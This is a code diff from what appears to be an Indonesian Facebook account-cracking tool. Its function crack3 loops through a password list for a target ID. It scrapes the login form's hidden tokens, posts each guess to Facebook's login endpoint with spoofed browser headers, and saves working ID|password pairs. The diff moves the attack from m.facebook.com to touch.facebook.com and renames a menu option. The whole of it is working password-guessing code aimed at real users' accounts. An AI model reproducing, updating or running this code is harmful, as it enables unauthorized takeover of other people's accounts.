@@ -473,7 +473,7 @@ def setting():
 		exit()
 	met = '# PILIH METHOD CRACK'
 	sol().print(mark(met, style='green'))
-	ioz = '[01] Method B-Api (Cepat)\n[02] Method Mobile (Lambat Hasil OK)\n[03] Methode Free Facebook (Sangat Lambat'
+	ioz = '[01] Method B-Api (Cepat)\n[02] Method Mobile (Lambat Hasil OK)\n[03] Methode touch(rekomendasi2)'
 	gess = nel(ioz, style='cyan')
 	cetak(nel(gess, title='METHOD'))
 	hc = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -699,8 +699,8 @@ def crack3(idf,pwv):
 	for pw in pwv:
 		try:
 			tix = time.time()
-			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://m.facebook.com/login/?email='+idf).text
+			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://touch.facebook.com/login/?email='+idf).text
 			dataa ={
 'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
 'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
@@ -709,10 +709,10 @@ def crack3(idf,pwv):
 'email':idf,
 'pass':pw
 }
-			ses.headers.update({'Host': 'm.facebook.com',
+			ses.headers.update({'Host': 'touch.facebook.com',
 'cache-control': 'max-age=0',
 'upgrade-insecure-requests': '1',
-'origin': 'https://m.facebook.com',
+'origin': 'https://touch.facebook.com',
 'content-type': 'application/x-www-form-urlencoded',
 'user-agent': ua,
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -720,11 +720,11 @@ def crack3(idf,pwv):
 'sec-fetch-mode': 'cors',
 'sec-fetch-user': 'empty',
 'sec-fetch-dest': 'document',
-'referer': 'https://m.facebook.com/login/?email='+idf,
+'referer': 'https://touch.facebook.com/login/?email='+idf,
 'accept-encoding':'gzip, deflate br',
 'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
 
-			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+			po = ses.post('https://touch.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
